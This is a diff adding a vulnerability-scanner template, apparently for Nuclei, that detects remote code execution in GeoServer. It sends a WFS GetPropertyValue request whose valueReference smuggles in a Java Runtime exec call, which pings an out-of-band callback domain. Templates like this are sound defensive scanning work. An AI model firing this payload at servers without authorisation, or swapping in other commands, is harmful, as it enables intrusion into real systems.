@@ -1,0 +1,24 @@
+id: geoserver-topp-rce
+info:
+  name: GeoServer topp Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, dnslog
+  description: |
+    This template detects a remote code execution vulnerability in GeoServer where attackers can execute arbitrary commands by crafting specific requests.
+
+variables:
+  domain: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /geoserver/topp/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=topp%3Astates&valueReference=exec(java.lang.Runtime.getRuntime()%2C'ping%20{{domain}}') HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
